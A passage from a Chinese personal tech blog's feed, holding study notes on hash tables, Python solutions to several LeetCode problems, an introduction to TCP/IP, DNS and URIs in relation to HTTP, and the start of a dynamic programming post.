class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span>H[<span class="number">20</span>]</div><div class="line"><span class="string">'chicken'</span></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>H[<span class="number">17</span>]</div><div class="line"><span class="string">'tiger'</span></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>H[<span class="number">20</span>]=<span class="string">'duck'</span></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>H[<span class="number">20</span>]</div><div class="line"><span class="string">'duck'</span></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>H.data</div><div class="line">[<span class="string">'bird'</span>, <span class="string">'goat'</span>, <span class="string">'pig'</span>, <span class="string">'duck'</span>, <span class="string">'dog'</span>, <span class="string">'lion'</span>,</div><div class="line">       <span class="string">'tiger'</span>, <span class="keyword">None</span>, <span class="keyword">None</span>, <span class="string">'cow'</span>, <span class="string">'cat'</span>]</div><div class="line">&gt;&gt; print(H[<span class="number">99</span>])</div><div class="line"><span class="keyword">None</span></div></pre></td></tr></table></figure><h3 id="hash分析"><a href="#hash分析" class="headerlink" title="hash分析"></a>hash分析</h3><p>我们之前说过，在最好的情况下，散列将提供 O(1)，恒定时间搜索。然而，由于冲突，比较的数量通常不是那么简单。即使对散列的完整分析超出了本文的范围，我们可以陈述一些近似搜索项所需的比较数量的已知结果。</p><p>我们需要分析散列表的使用的最重要的信息是负载因子 λ。概念上，如果 λ 小，则碰撞的机会较低，这意味着项更可能在它们所属的槽中。如果 λ 大，意味着表正在填满，则存在越来越多的冲突。这意味着冲突解决更困难，需要更多的比较来找到一个空槽。使用链接，增加的碰撞意味着每个链上的项数量增加。</p><p>和以前一样，我们将有一个成功的搜索结果和不成功的。对于使用具有线性探测的开放寻址的成功搜索，平均比较数大约为<code>1/2（1 + 1/(1-λ)）</code>，不成功的搜索为 1/2(1+(1/1-λ)^2 ) 如果我们使用链接，则对于成功的情况，平均比较数目是 1+λ/2，如果搜索不成功，则简单地是 λ 比较次数。</p>]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;目标&quot;&gt;&lt;a href=&quot;#目标&quot; class=&quot;headerlink&quot; title=&quot;目标&quot;&gt;&lt;/a&gt;目标&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;能够解释和实现顺序查找和二分查找
    
    </summary>
    
      <category term="Python" scheme="http://adamzeng.site/categories/Python/"/>
    
    
      <category term="Python" scheme="http://adamzeng.site/tags/Python/"/>
    
  </entry>
  
  <entry>
    <title>leetcode371题</title>
    <link href="http://adamzeng.site/2017/11/06/leetcode371/"/>
    <id>http://adamzeng.site/2017/11/06/leetcode371/</id>
    <published>2017-11-06T08:11:29.000Z</published>
    <updated>2017-11-06T12:30:39.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="leetcode371题389题401题461题645题"><a href="#leetcode371题389题401题461题645题" class="headerlink" title="leetcode371题389题401题461题645题"></a>leetcode371题389题401题461题645题</h1><h3 id="371题"><a href="#371题" class="headerlink" title="371题"></a>371题</h3><p>Calculate the sum of two integers <em>a</em> and <em>b</em>, but you are <strong>not allowed</strong> to use the operator <code>+</code> and <code>-</code>.<a id="more"></a></p><p><strong>Example:</strong><br>Given <em>a</em> = 1 and <em>b</em> = 2, return 3.</p><p><strong>Credits:</strong><br>Special thanks to <a href="https://discuss.leetcode.com/user/fujiaozhu" target="_blank" rel="external">@fujiaozhu</a> for adding this problem and creating all test cases.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span><span class="params">(object)</span>:</span></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">getSum</span><span class="params">(self, a, b)</span>:</span></div><div class="line">        <span class="string">"""</span></div><div class="line">        :type a: int</div><div class="line">        :type b: int</div><div class="line">        :rtype: int</div><div class="line">        """</div><div class="line">        <span class="string">"""</span></div><div class="line">        两个数的二进制形式：如5 = 0b101 ,3 = 0b011 ,两个二进制位如果一个为0,一个为1，则加之后为1,如果都为0，则加之后为0,如果都为1，则加之后为0，且向前进位，需要进位的位置为两个数的逻辑与</div><div class="line">        因为Python的整数不是固定的32位，所以需要做一些特殊的处理，具体见代码吧。</div><div class="line">代码里的将一个数对0x100000000取模（注意：Python的取模运算结果恒为非负数），是希望该数的二进制表示从第32位开始到更高的位都同是0（最低位是第0位），以在0-31位上模拟一个32位的int</div><div class="line">        """</div><div class="line">        <span class="keyword">while</span> b:</div><div class="line">            carry = a &amp; b</div><div class="line">            a = (a ^ b) % <span class="number">0x100000000</span></div><div class="line">            b = (carry &lt;&lt; <span class="number">1</span>) % <span class="number">0x100000000</span></div><div class="line">        <span class="keyword">return</span> a <span class="keyword">if</span> a &lt;= <span class="number">0x7FFFFFFF</span> <span class="keyword">else</span> a | (~<span class="number">0x100000000</span>+<span class="number">1</span>)</div></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span><span class="params">(object)</span>:</span></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">getSum</span><span class="params">(self, a, b)</span>:</span></div><div class="line">        <span class="string">"""</span></div><div class="line">        :type a: int</div><div class="line">        :type b: int</div><div class="line">        :rtype: int</div><div class="line">        """</div><div class="line">        <span class="keyword">return</span> sum([a,b])</div></pre></td></tr></table></figure><h3 id="389题"><a href="#389题" class="headerlink" title="389题"></a>389题</h3><p>Given two strings <strong>s</strong> and <strong>t</strong> which consist of only lowercase letters.</p><p>String <strong>t</strong> is generated by random shuffling string <strong>s</strong> and then add one more letter at a random position.</p><p>Find the letter that was added in <strong>t</strong>.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">Input:</div><div class="line">s = <span class="string">"abcd"</span></div><div class="line">t = <span class="string">"abcde"</span></div><div class="line"></div><div class="line">Output:</div><div class="line">e</div><div class="line"></div><div class="line">Explanation:</div><div class="line"><span class="string">'e'</span> <span class="keyword">is</span> the letter that was added.</div></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span><span class="params">(object)</span>:</span></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">findTheDifference</span><span class="params">(self, s, t)</span>:</span></div><div class="line">        <span class="string">"""</span></div><div class="line">        :type s: str</div><div class="line">        :type t: str</div><div class="line">        :rtype: str</div><div class="line">        """</div><div class="line">        m=list(t)</div><div class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> s:</div><div class="line">            m.remove(i)</div><div class="line">        <span class="keyword">return</span> m[<span class="number">0</span>]</div></pre></td></tr></table></figure><p>我自己的解法，将t变为list，再遍历s中的字符，去除t中与s相同的字符,再返回m中剩余的所有字符。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line"></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span><span class="params">(object)</span>:</span></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">findTheDifference</span><span class="params">(self, s, t)</span>:</span></div><div class="line">        <span class="string">"""</span></div><div class="line">        :type s: str</div><div class="line">        :type t: str</div><div class="line">        :rtype: str</div><div class="line">        """</div><div class="line">        <span class="comment"># d = dict.fromkeys(t,0)</span></div><div class="line">        <span class="comment"># for i in s:</span></div><div class="line">        <span class="comment">#     d[i] += 1;</span></div><div class="line">        <span class="comment"># for j in t:</span></div><div class="line">        <span class="comment">#     d[j] -= 1;</span></div><div class="line">        <span class="comment">#     if d[j] &lt; 0:</span></div><div class="line">        <span class="comment">#         return j </span></div><div class="line">        <span class="comment"># 第二种方法：排序</span></div><div class="line">        s, t = sorted(s), sorted(t)</div><div class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(len(s)):</div><div class="line">            <span class="keyword">if</span> s[i] != t[i]:</div><div class="line">                <span class="keyword">return</span> t[i]</div><div class="line">        <span class="keyword">return</span> t[<span class="number">-1</span>]</div></pre></td></tr></table></figure><p>我所挑选的答案，均不是性能最优方案，但代码非常简单，易读。</p><h3 id="401题"><a href="#401题" class="headerlink" title="401题"></a>401题</h3><p>A binary watch has 4 LEDs on the top which represent the <strong>hours</strong> (<strong>0-11</strong>), and the 6 LEDs on the bottom represent the <strong>minutes</strong> (<strong>0-59</strong>).</p><p>Each LED represents a zero or one, with the least significant bit on the right.</p><p><img src="https://upload.wikimedia.org/wikipedia/commons/8/8b/Binary_clock_samui_moon.jpg" alt="image"></p><p>For example, the above binary watch reads “3:25”.</p><p>Given a non-negative integer <em>n</em> which represents the number of LEDs that are currently on, return all possible times the watch could represent.</p><p><strong>Example:</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">Input: n = <span class="number">1</span></div><div class="line">Return: [<span class="string">"1:00"</span>, <span class="string">"2:00"</span>, <span class="string">"4:00"</span>, <span class="string">"8:00"</span>, <span class="string">"0:01"</span>, <span class="string">"0:02"</span>, <span class="string">"0:04"</span>, <span class="string">"0:08"</span>, <span class="string">"0:16"</span>, <span class="string">"0:32"</span>]</div></pre></td></tr></table></figure><p><strong>Note:</strong></p><ul><li><p>The order of output does not matter.</p></li><li><p>The hour must not contain a leading zero, for example “01:00” is not valid, it should be “1:00”.</p></li><li><p>The minute must be consist of two digits and may contain a leading zero, for example “10:2” is not valid, it should be “10:02”.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">Input: n = <span class="number">1</span></div><div class="line">Return: [<span class="string">"1:00"</span>, <span class="string">"2:00"</span>, <span class="string">"4:00"</span>, <span class="string">"8:00"</span>, <span class="string">"0:01"</span>, <span class="string">"0:02"</span>, <span class="string">"0:04"</span>, <span class="string">"0:08"</span>, <span class="string">"0:16"</span>, <span class="string">"0:32"</span>]</div></pre></td></tr></table></figure><p>​</p></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span><span class="params">(object)</span>:</span></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">readBinaryWatch</span><span class="params">(self, num)</span>:</span></div><div class="line">        <span class="string">"""</span></div><div class="line">        :type num: int</div><div class="line">        :rtype: List[str]</div><div class="line">        """</div><div class="line">        <span class="function"><span class="keyword">def</span> <span class="title">bit_count</span><span class="params">(bits)</span>:</span></div><div class="line">            count = <span class="number">0</span></div><div class="line">            <span class="keyword">while</span> bits:</div><div class="line">                bits &amp;= bits<span class="number">-1</span></div><div class="line">                count += <span class="number">1</span></div><div class="line">            <span class="keyword">return</span> count</div><div class="line"></div><div class="line">        <span class="keyword">return</span> [<span class="string">'%d:%02d'</span> % (h, m)</div><div class="line">            <span class="keyword">for</span> h <span class="keyword">in</span> xrange(<span class="number">12</span>) <span class="keyword">for</span> m <span class="keyword">in</span> xrange(<span class="number">60</span>)</div><div class="line">            <span class="keyword">if</span> bit_count(h) + bit_count(m) == num]</div></pre></td></tr></table></figure><p>bit_count函数是一个非常厉害的函数，它返回了由1 2 4 8组成的数所需的灯的数量，当然也是计算由1 2 4 8 16 32组成的数所需的灯的数量。</p><p>下面的返回也很有讲究，直接遍历12个小时数与60和分钟数，再用if来限定。</p><h3 id="461题"><a href="#461题" class="headerlink" title="461题"></a>461题</h3><p>解释：汉明距离就是其二进制数对应位不同的个数。</p><p> 汉明距离是以理查德·卫斯里·汉明的名字命名的。在信息论中，两个等长字符串之间的汉明距离是两个字符串对应位置的不同字符的个数。换句话说，它就是将一个字符串变换成另外一个字符串所需要替换的字符个数。</p><p>​    For example:<br>​    例如：</p><p>​    The Hamming distance between 1011101 and 1001001 is 2.<br>​    The Hamming distance between 2143896 and 2233796 is 3.<br>​    The Hamming distance between “toned” and “roses” is 3.<br>​    1011101 与 1001001 之间的汉明距离是 2。<br>​    2143896 与 2233796 之间的汉明距离是 3。<br>​    “toned” 与 “roses” 之间的汉明距离是 3。</p><hr><p>The <a href="https://en.wikipedia.org/wiki/Hamming_distance" target="_blank" rel="external">Hamming distance</a> between two integers is the number of positions at which the corresponding bits are different.</p><p>Given two integers <code>x</code> and <code>y</code>, calculate the Hamming distance.</p><p><strong>Note:</strong><br>0 ≤ <code>x</code>, <code>y</code> &lt; 231.</p><p><strong>Example:</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">Input: x = <span class="number">1</span>, y = <span class="number">4</span></div><div class="line"></div><div class="line">Output: <span class="number">2</span></div><div class="line"></div><div class="line">Explanation:</div><div class="line"><span class="number">1</span>   (<span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">1</span>)</div><div class="line"><span class="number">4</span>   (<span class="number">0</span> <span class="number">1</span> <span class="number">0</span> <span class="number">0</span>)</div><div class="line">       ↑   ↑</div><div class="line"></div><div class="line">The above arrows point to positions where the corresponding bits are different.</div></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span><span class="params">(object)</span>:</span></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">hammingDistance</span><span class="params">(self, x, y)</span>:</span></div><div class="line">        <span class="string">"""</span></div><div class="line">        :type x: int</div><div class="line">        :type y: int</div><div class="line">        :rtype: int</div><div class="line">        """</div><div class="line">        times = <span class="number">0</span></div><div class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">32</span>):</div><div class="line">            bit1=x%<span class="number">2</span></div><div class="line">            bit2=y%<span class="number">2</span></div><div class="line">            x=x/<span class="number">2</span></div><div class="line">            y=y/<span class="number">2</span></div><div class="line">            <span class="keyword">if</span> bit1 != bit2:</div><div class="line">                times = times + <span class="number">1</span></div><div class="line">        <span class="keyword">return</span> times</div></pre></td></tr></table></figure><p>我的解法，果然又是跑起来很慢的那种，下面是最快解法：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span><span class="params">(object)</span>:</span></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">hammingDistance</span><span class="params">(self, x, y)</span>:</span></div><div class="line">        <span class="string">"""</span></div><div class="line">        :type x: int</div><div class="line">        :type y: int</div><div class="line">        :rtype: int</div><div class="line">        """</div><div class="line">        </div><div class="line">        <span class="keyword">return</span> bin(x^y).count(<span class="string">'1'</span>)</div></pre></td></tr></table></figure><p>基本只用了一行代码。。。通过抑或^,获得x^y之后获得的二进制数，x与y进行^运算相同的位结果是0，不同的位结果是1，然后通过count方法数出该二进制数中所剩下的有1的位，就得出x与y相同位不同数字的总个数了，也就是Hamming Distance！</p><h3 id="654题"><a href="#654题" class="headerlink" title="654题"></a>654题</h3><p>The set <code>S</code> originally contains numbers from 1 to <code>n</code>. But unfortunately, due to the data error, one of the numbers in the set got duplicated to <strong>another</strong> number in the set, which results in repetition of one number and loss of another number.</p><p>Given an array <code>nums</code> representing the data status of this set after the error. Your task is to firstly find the number occurs twice and then find the number that is missing. Return them in the form of an array.</p><p><strong>Example 1:</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">Input: nums = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">4</span>]</div><div class="line">Output: [<span class="number">2</span>,<span class="number">3</span>]</div></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span><span class="params">(object)</span>:</span></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">findErrorNums</span><span class="params">(self, nums)</span>:</span></div><div class="line">        <span class="string">"""</span></div><div class="line">        :type nums: List[int]</div><div class="line">        :rtype: List[int]</div><div class="line">        """</div><div class="line">        N = len(nums)</div><div class="line">        count = [<span class="number">0</span>] * (N+<span class="number">1</span>)</div><div class="line">        <span class="keyword">for</span> x <span class="keyword">in</span> nums:</div><div class="line">            count[x] += <span class="number">1</span></div><div class="line">        <span class="keyword">for</span> x <span class="keyword">in</span> xrange(<span class="number">1</span>, len(nums)+<span class="number">1</span>):</div><div class="line">            <span class="keyword">if</span> count[x] == <span class="number">2</span>:</div><div class="line">                twice = x</div><div class="line">            <span class="keyword">if</span> count[x] == <span class="number">0</span>:</div><div class="line">                never = x</div><div class="line">        <span class="keyword">return</span> twice, never</div></pre></td></tr></table></figure><p>太牛逼的解法，只能跪服，这道题我只符合了11/49cases。。</p><p>很难受，思路是count其实统计的是nums中出现的数字的次数。一般来说只有一个数出现的次数是2，其他出现的次数是1。下面遍历从1到nums+1的长度中的所有数，发现在count中次数为2的就是我们要找的，而次数为0的就是出现error未出现在nums中的。其实不太对，我发现有的用例很奇怪，[5,5]这种用例的话，上述代码也不符合。因为是遍历从1到nums+1长度的数，因为[5,5]这种列表不是从1开始的，所以很奇怪。。。</p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;leetcode371题389题401题461题645题&quot;&gt;&lt;a href=&quot;#leetcode371题389题401题461题645题&quot; class=&quot;headerlink&quot; title=&quot;leetcode371题389题401题461题645题&quot;&gt;&lt;/a&gt;leetcode371题389题401题461题645题&lt;/h1&gt;&lt;h3 id=&quot;371题&quot;&gt;&lt;a href=&quot;#371题&quot; class=&quot;headerlink&quot; title=&quot;371题&quot;&gt;&lt;/a&gt;371题&lt;/h3&gt;&lt;p&gt;Calculate the sum of two integers &lt;em&gt;a&lt;/em&gt; and &lt;em&gt;b&lt;/em&gt;, but you are &lt;strong&gt;not allowed&lt;/strong&gt; to use the operator &lt;code&gt;+&lt;/code&gt; and &lt;code&gt;-&lt;/code&gt;.
    
    </summary>
    
      <category term="leetcode" scheme="http://adamzeng.site/categories/leetcode/"/>
    
    
      <category term="leetcode" scheme="http://adamzeng.site/tags/leetcode/"/>
    
  </entry>
  
  <entry>
    <title>TCP/IP与HTTP的关系</title>
    <link href="http://adamzeng.site/2017/11/06/TCP-IP%E4%B8%8EHTTP%E7%9A%84%E5%85%B3%E7%B3%BB/"/>
    <id>http://adamzeng.site/2017/11/06/TCP-IP与HTTP的关系/</id>
    <published>2017-11-06T02:41:11.000Z</published>
    <updated>2017-11-06T03:53:08.000Z</updated>
    
    <content type="html"><![CDATA[<p>按层次分，IP（Internet Protocol）网际协议位于网络层。Internet Protocol这个名称可能听上去有点夸张，但事实正是如此，因为几乎所有使用网络的系统都会用到IP协议。TCP/IP协议族中的IP指的就是网际协议，协议名称中占据了一半位置，其重要性可见一斑。可能有人会把“IP”和”IP地址”搞混，”IP”实际是一种协议的名称。<a id="more"></a></p><p>IP协议的作用是把各种数据包传送给对方。而要保证确实传送到对方那里，则需要满足各种条件。其中两个重要条件是IP地址和MAC地址（Media Access Control Address）。</p><p>IP地址指明了节点被分配到的地址，MAC地址是指网卡所属的固定地址。IP地址可以和MAC地址进行配对。IP地址可变换，但MAC地址基本上不会更改。</p><p>使用ARP协议凭借MAC地址进行通信。</p><p>IP间的通信以来MAC地址。在网络上，通信的双方在同一局域网（LAN）内的情况是很少的，通常是经过多台计算机和网络设备中转才能连接到对方。而在进行中转时，会利用下一站中转设备的MAC地址来搜索下一个中转目标。这时，会采用ARP协议（Address Resolution Protocol）。ARP是一种用以解析地址的协议，根据通信方的IP地址就可以反查出对应的MAC地址。</p><p>没有人能够全面掌握互联网中的传输状况。</p><p>在到达通信目标前的中转过程中，哪些计算机和路由器等网络设备只能获悉很粗略的传输路线。</p><p>这种机制称为路由选择（routing），有点像快递公司的送货过程。想要寄快递的人，只要将自己的货物送到集散中心买就可以知道快递公司是否肯收件发货，该快递公司的集散中心检查货物的送达地址，明确下站该送往哪个区域的集散中心。接着，哪个区域的集散中心自会判断是否能送到对方家中。</p><p>我们是想通过这个比喻说明，无论哪台计算机、哪台网络设备、它们都无法全面掌握互联网中的细节。</p><p><img src="http://oxufz8asv.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202017-11-06%20%E4%B8%8A%E5%8D%8810.56.51.png" alt="image"></p><h3 id="确保可靠性的TCP协议"><a href="#确保可靠性的TCP协议" class="headerlink" title="确保可靠性的TCP协议"></a>确保可靠性的TCP协议</h3><p>按层次分，TCP位于传输层，提供可靠的字节流服务。</p><p>所谓的字节流服务（Byte Stream Service）是指，为了方便传输，将大块数据分割成以报文段（segment）为单位的数据包进行管理。而可靠的传输服务是指，能够把数据准确可靠地传给对方。一言以蔽之，TCP协议为了更容易传送大数据才把数据分割，而且TCP协议能够确认数据最终是否送达到对方。</p><p>确保数据能到达目标</p><p>为了准确无误地将数据送达目标处，TCP协议采用了三次握手（three）way handshaking）策略。用TCP协议把数据包送出去后，TCP不会对传送后的情况置之不理，它一定会向对方确认是否成功送达。</p><p>握手过程中使用了TCP的标志（flag）——SYN    （synchronize）和ACK（acknonwledgement）。</p><p>发送端首先发送一个带SYN标志的数据包给对方。接收端收到后，回传一个带有SYN/ACK标志的数据包以示传达确认信息。最后，发送端再回传一个带ACK标志的数据包，代表“握手”结束。</p><p>若在握手过程中某个阶段莫名中断,TCP协议会再次以相同的顺序发送相同的数据包。</p><p><img src="http://oxufz8asv.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202017-11-06%20%E4%B8%8A%E5%8D%8811.17.10.png" alt="image"></p><p>除了上述三次握手，TCP协议还有其他各种手段来保证通信的可靠性。</p><h3 id="负责域名解析的DNS服务"><a href="#负责域名解析的DNS服务" class="headerlink" title="负责域名解析的DNS服务"></a>负责域名解析的DNS服务</h3><p>DNS（Domain Name System）服务是和HTTP协议一样位于应用层的协议。它提供域名到IP地址之间的解析服务。</p><p>计算机既可以被赋予IP地址，也可以被赋予主机名和域名。比如www.hackr.jp.</p><p>用户通常使用主机名或域名来访问对方的计算机，而不是直接通过IP地址访问。因为与IP地址的一组纯数字相比，用字母配合数字表示形式来指定计算机名更符合人类的记忆习惯。</p><p>但要让计算机去理解名称，相对而言就变得困难了。因为计算机更擅长处理一长串数字。</p><p>为了解决上述的问题，DNS服务应运而生。DNS协议提供通过域名查找IP地址，或逆向从IP地址反查域名的服务。</p><p><img src="http://oxufz8asv.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202017-11-06%20%E4%B8%8A%E5%8D%8811.25.22.png" alt="image"></p><h3 id="各种协议与HTTP协议的关系"><a href="#各种协议与HTTP协议的关系" class="headerlink" title="各种协议与HTTP协议的关系"></a>各种协议与HTTP协议的关系</h3><p>学习了和HTTP协议密不可分的TCP/IP协议族中的各种协议后，我们再通过这张图来了解下IP协议、TCP协议和DNS服务在使用HTTP协议的通信过程中各自发挥了哪些作用。</p><p><img src="http://oxufz8asv.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202017-11-06%20%E4%B8%8A%E5%8D%8811.28.17.png" alt="image"></p><h3 id="URI和URL"><a href="#URI和URL" class="headerlink" title="URI和URL"></a>URI和URL</h3><p>与URI（统一资源标识符）相比，我们更熟悉URL（Uniform Resource Locator，统一资源定位符）。URL正是使用Web浏览器等访问Web页面时需要输入的网页地址。比如，下图的<a href="http://hackr.jp/就是URL。" target="_blank" rel="external">http://hackr.jp/就是URL。</a></p><p><img src="http://oxufz8asv.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202017-11-06%20%E4%B8%8A%E5%8D%8811.35.05.png" alt="image"></p><h3 id="统一资源标识符"><a href="#统一资源标识符" class="headerlink" title="统一资源标识符"></a>统一资源标识符</h3><p>URI是Uniform Resource Identifier的缩写。RFC2396分别对这3个单词进行了如下定义。</p><h4 id="Uniform"><a href="#Uniform" class="headerlink" title="Uniform"></a>Uniform</h4><p>规定统一的格式可方便处理多种不同类型的资源，而不用根据上下文环境来识别资源指定的访问方式。另外，加入新增的协议方案（如http:或ftp:)也更容易。</p><h4 id="Resource"><a href="#Resource" class="headerlink" title="Resource"></a>Resource</h4><p>资源的定义是“可标识的任何东西”。除了文档文件、图像或服务（例如当天的天气预报）等能够区别于其他类型的，全都可作为资源。另外，资源不仅可以是单一的，也可以是多数的集合体。</p><h4 id="Identifier"><a href="#Identifier" class="headerlink" title="Identifier"></a>Identifier</h4><p>表示可标识的对象。也称为标识符。</p><p>综上所述，URI就是由某个协议方案表示的资源的定位标识符。协议方案是指访问资源所使用的协议类型名称。</p><p>采用HTTP协议时，协议方案就是http。除此之外，还有ftp、mailto、telnet、file等。标准的URI协议方案有30种左右，由隶属于国际互联网管理的非营利社团ICANN（Internet Corporation for Assigned Names and  Numbers,互联网名称与数字地址分配机构）的IANA（Internet Assigned Numbers Authority，互联网号码分配局）管理颁布。</p><ul><li><p>IANA-Uniform Resource Identifier（URI）SCHEMES（统一资源标识符方案）</p><p><a href="http://www.iana.org/assignments/uri-schemes" target="_blank" rel="external">http://www.iana.org/assignments/uri-schemes</a></p><p>URI用字符串标识某一互联网资源，而URL表示资源的地点（互联网上所处的位置）。可见URL是URI的子集。</p><p><img src="http://oxufz8asv.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202017-11-06%20%E4%B8%8A%E5%8D%8811.50.24.png" alt="image"></p><p>​</p><p>​</p></li></ul><p>​    </p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;按层次分，IP（Internet Protocol）网际协议位于网络层。Internet Protocol这个名称可能听上去有点夸张，但事实正是如此，因为几乎所有使用网络的系统都会用到IP协议。TCP/IP协议族中的IP指的就是网际协议，协议名称中占据了一半位置，其重要性可见一斑。可能有人会把“IP”和”IP地址”搞混，”IP”实际是一种协议的名称。
    
    </summary>
    
      <category term="HTTP" scheme="http://adamzeng.site/categories/HTTP/"/>
    
    
      <category term="HTTP" scheme="http://adamzeng.site/tags/HTTP/"/>
    
  </entry>
  
  <entry>
    <title>动态规划</title>
    <link href="http://adamzeng.site/2017/11/05/%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/"/>
    <id>http://adamzeng.site/2017/11/05/动态规划/</id>
    <published>2017-11-05T14:24:58.000Z</published>
    <updated>2017-11-05T15:34:33.000Z</updated>
    
